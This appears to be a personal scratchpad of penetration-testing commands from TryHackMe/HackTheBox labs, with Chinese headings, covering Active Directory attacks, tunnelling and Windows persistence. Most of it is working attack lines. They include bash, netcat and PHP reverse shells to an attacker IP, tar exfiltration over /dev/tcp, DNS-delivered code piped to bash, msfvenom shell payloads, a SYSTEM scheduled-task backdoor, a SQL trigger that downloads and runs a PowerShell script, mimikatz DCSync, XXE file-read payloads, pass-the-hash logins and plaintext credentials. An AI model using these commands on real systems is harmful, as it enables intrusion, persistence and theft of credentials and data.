## 列举 

xfreerdp /v:thmserver2.za.tryhackme.loc /u:paula.bailey /p:THM

ssh za.tryhackme.loc\\svcServMan@thmserver2.za.tryhackme.loc

ssh user@10.10.54.76

dig -t AXFR redteam.thm @10.10.54.76

snmpcheck.rb 10.10.54.76 -c public | more


def hex_to_bin(hex_str):
    return bin(int(hex_str, 16))[2:]

def bin_multiplication(bin1, bin2):
    return bin(int(bin1, 2) * int(bin2, 2))[2:]

def mod_bin(bin_str, mod_str):
    mod_int = int(mod_str, 2)
    result_int = int(bin_str, 2) % mod_int
    return bin(result_int)[2:]

def bin_to_hex(bin_str):
    return hex(int(bin_str, 2))[2:].upper()

# 输入的16进制字符串
hex_str1 = "02"
hex_str2 = "38"

# 把16进制字符串转换为二进制字符串
bin_str1 = hex_to_bin(hex_str1)
bin_str2 = hex_to_bin(hex_str2)

# 打印转换后的二进制字符串
print(f"{hex_str1} in binary: {bin_str1}")
print(f"{hex_str2} in binary: {bin_str2}")

# 二进制字符串相乘
multiplied_bin = bin_multiplication(bin_str1, bin_str2)

# 打印相乘后的二进制字符串
print(f"Multiplication result in binary: {multiplied_bin}")

# 取模操作
mod_str = "100011011"  # 100011011 in binary
modded_bin = mod_bin(multiplied_bin, mod_str)

# 打印取模后的二进制字符串
print(f"Result after mod operation in binary: {modded_bin}")

# 转换为16进制
result_hex = bin_to_hex(modded_bin)

# 打印最终结果
print(f"Final result in hex: {result_hex}")


tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/10.17.59.71/8080

tar cf - task5/ | ssh thm@10.17.59.71 "cd ~/work; tar xpf -"

VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo=

H4sIAAAAAAAAA+3RPQ4CIRCGYeo9BSdQQGATO49CXAtjFAMYPb672G38qYgxvk8zDFDM5CshH/xSNKVGvXO1jua1nrU1ziqle2+E0sorJ6RrO9bDJZeQpBQpxvLu36f3H1Vq/tu0G/Ki3NpsOAXsrX2dv/Wz/I0dr6RqMs3Mn+cfhuP+tD6HnK8xDd2mttqsrPPdtPK6xJi6b08JAAAAAAAAAAAAAAAA4Jk7FWUx0QAoAAA=

python3 neoreg.py -k thm -u http://flag.thm.com/flag

curl --socks5 127.0.0.1:1080 http://flag.thm.com/flag

python3 neoreg.py -k admin -u http://10.10.127.25/uploader/files/tunnel.php

crunch 5 5 -t "THM@%" -o tryhackme.txt
crunch 5 5 -t "THM^^" -o tryhackme.txt

Az"[0-9][0-9]" ^[!@]

bash -i >& /dev/tcp/10.17.59.71/4444 0>&1

systemd-resolve --interface exploitad --set-dns 10.200.35.101 --set-domain za.tryhackme.loc

Your credentials have been generated: 
Username: barbara.reid 
Password: Password1

ssh za.tryhackme.loc\\barbara.reid@thmwrk1.za.tryhackme.loc

t2_melanie.davies
$Password = ConvertTo-SecureString "Admin@login123" -AsPlainText -Force
Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password

xfreerdp /v:thmwrk1.za.tryhackme.loc /u:barbara.reid /p:Password1

tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@

ssh za.tryhackme.loc\\t2_melanie.davies@thmwrk1.za.tryhackme.loc

tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones 


Your credentials have been generated: 
Username: sarah.hilton 
Password: Newcastle1988

Username: svcServMan
Password: Sup3rStr0ngPass!@

xfreerdp /v:thmwrk1.za.tryhackme.loc /u:sarah.hilton  /p:Newcastle1988

Add-ADGroupMember "IT Support" -Members "sarah.hilton"

runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe

xfreerdp /v:thmserver2.za.tryhackme.loc /u:sarah.hilton  /p:Newcastle1988

ssh za.tryhackme.loc\\sarah.hilton@thmserver2.za.tryhackme.loc

Get-ADGroupMember -Identity "Domain Admins" 

Add-ADGroupMember "Domain Admins" -Members "sarah.hilton"

.\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:cert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.35.101

Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::

evil-winrm -i 10.10.46.109 -u Administrator -H f3118544a831e728781d780cfdb9c1fa

thmuser1
Password321

xfreerdp /u:thmuser1  /p:Password321 /v:10.10.46.109
admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b% 
<?xml version="1.0"?>

<!DOCTYPE ANY [
         <!ENTITYcontent SYSTEM"file:///etc/passwd">]>
   <name>&content;</name>

   <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///home/barry/.ssh/id_rsa.pub" >]>
<comment>
  <name>&name;</name>
  <author>Pavandeep</author>
  <com>Hacking Articles</com>
</comment>

-----BEGIN RSA PRIVATE KEY-----
D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk 4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8 7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+ T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7 LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF 6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs 7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of 1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD 
-----END RSA PRIVATE KEY-----

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----

echo "cat /root/root.txt" | at now

xfreerdp /v:10.10.209.195 /u:thm /p:Password1@

用户名： thm

密码： Password1@

域： lunar.eruca.com

evil-winrm -i 10.10.209.195 -u thm

ssh thm@10.10.209.195

nc -lvp 8080 > ~/work/thm

curl --socks5 127.0.0.1:1080 http://flag.thm.com/flag

http://flag.thm.com/flag

curl --socks5 127.0.0.1:1080 http://45.33.23.183:80/flag

python3 neoreg.py -k thm -u http://10.10.191.112/uploader/files/tunnel.hp
curl --socks5 127.0.0.1:1080 http://10.10.191.112/flag

python3 neoreg.py -k thm -u http://flag.thm.com/

curl --socks5 127.0.0.1:1080 http://172.20.0.121:80

sudo nping --icmp -c 1 10.17.59.71 --data-string "BOFfile.txt"

xfreerdp /v:10.10.107.133 /u:Administrator /p:Password321

sudo nping --icmp -c 1 10.17.59.71 --data-string "BOFfile.txt"

dig +short -t TXT flag.tunnel.com | tr -d "\"" | base64 -d | bash

sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com                                                                     

proxychains curl http://192.168.0.100/demo.php #OR curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php



## windows本地持久化

evil-winrm -i 10.10.181.58 -u thmuser2 -p Password321

Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.17.59.71 4445"

Invoke-WebRequest -Uri "http://10.17.59.71:8000/" -OutFile "C:\windows\"

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.59.71 LPORT=4448 -f exe-service -o rev-svc.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.59.71 LPORT=5558 -f exe-service -o rev-svc2.exe

schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.17.59.71 4449" /ru SYSTEM

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.59.71 LPORT=4450 -f exe -o revshell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.59.71 LPORT=4451 -f exe -o vshell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.59.71 LPORT=4452 -f exe -o revshell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.59.71 LPORT=4453 -f exe -o revshell.exe

sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO

USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];

USE HRDB

CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://10.17.59.71:8000/evilscript.ps1'')"';

CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://10.17.59.71:8000/evilscript.ps1'')"';


msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.59.71 LPORT=4444 -f exe -o revshell.exe

python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.92.34 -windows-auth

xp_cmdshell "powershell -c Invoke-WebRequest http://10.17.59.71:8000/revshell.exe -Outfile C:\Users\sql_svc\Downloads\revshell.exe"

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.17.59.71:8000/revshell.exe -O C:\Users\sql_svc\Downloads\revshell.exe"

xp_cmdshell "powershell -c Invoke-WebRequest -Uri "http://10.17.59.71:8000/revshell.exe -OutFile "C:\windows\system32\revshell.exe""

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.17.59.71:8000/revshell.exe -outfile revshell.exe"

Invoke-WebRequest -Uri "http://10.17.59.71:8000/" -OutFile "C:\Users\sql_svc\Downloads\revshell.exe"

xp_cmdshell "powershell -c "

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; Invoke-WebRequest -Uri "http://10.17.59.71:8000/" -OutFile "C:\Users\sql_svc\Downloads\revshell.exe""

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.17.59.71:8000/revshell.exe -outfile revshell.exe"

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.17.59.71:8000/nc64.exe -outfile nc64.exe"

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.17.59.71/nc64.exe -outfile nc64.exe"

xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.17.59.71/nc64.exe\");"


python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth


enable_xp_cmdshell
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
EXEC sp_configure 'xp_cmdshell', 1;
reconfigure;


EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.17.59.71/nc64.exe -outfile nc64.exe"


xp_cmdshell "powershell -c cd C:\Users\sql_svc\Desktop;dir"


xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

\\Archetype\backups /user:administrator MEGACORP_4dm1n!!

evil-winrm -i 10.129.95.187 -u administrator -p MEGACORP_4dm1n!!

b91ccec3305e98240082d4474b848528

sqlmap -u http://10.129.9.183/dashboard.php?search=1 --cookie=lmfilutn16chv6vmukdsk6gmno -p "search" -- --batch 

sqlmap -u http://10.129.112.148/dashboard.php?search='test=+' --cookie="PHPSESSID=vi81imss7id1j1ac83naebhdst" --os-shell

lmfilutn16chv6vmukdsk6gmno

systemd-resolve --interface persistad --set-dns 10.200.86.100 --set-domain za.tryhackme.loc

ssh za\\pauline.hargreaves@thmwrk1.za.tryhackme.loc

Your credentials have been generated: 
Username: pauline.hargreaves 
Password: ld0nCTVbM

用户名：Administrator
密码：tryhackmewouldnotguess1@
域：ZA

ssh za\\Administrator@thmwrk1.za.tryhackme.loc

lsadump::dcsync /domain:za.tryhackme.loc /user:test

C:\Tools\mimikatz_trunk\x64\dcdump_tim.txt

scp -P 8000 C:\Tools\mimikatz_trunk\x64\dcdump_tim.txt root@10.50.83.86:/root 

evil-winrm -i 10.200.86.248 -u Administrator -p tryhackmewouldnotguess1@

download C:\Tools\mimikatz_trunk\x64\dcdump_tim.txt

cat grep 'krbtgt|NTLM'

用户名：thm 
密码：Passw0rd！

import zlib
import binascii

id = ''
result = binascii.unhexlify(id)
print(result)
result = zlib.decompress(result)
print(result)

LFILE=startup_list.txt
./chmod 6777 $LFILE

bash -i >& /dev/tcp/10.17.59.71/4444 0>&1

r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.20.20 4242 >/tmp/f

r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.72.135 4444 >/tmp/f

whoami;php -r '$sock=fsockopen("10.17.59.71",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

whoami;bash -i >& /dev/tcp/10.17.59.71/4444 0>&1

whoami;exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.72.135/4444 0>&1'");
?>

def verify_password(username, password):
    # 1. 将用户名划分成4字节一组的块
    chunks = [username[i:i+4] for i in range(0, len(username), 4)]
    
    # 2. 将每个块转换成32位整数
    integers = [int.from_bytes(chunk.encode(), byteorder='little') for chunk in chunks]
    
    # 3. 对这些整数进行循环左移5位的运算
    shifted = [((num << 5) | (num >> 27)) & 0xFFFFFFFF for num in integers]
    
    # 4. 将移位后的整数相加
    v3 = sum(shifted)
    
    # 5. 将计算出的v3值与输入的密码进行比较
    return v3 == int(password)

# 测试
username = "abcdefgh"
password = "89a0d8ec"
print(verify_password(username, password))  # 输出 True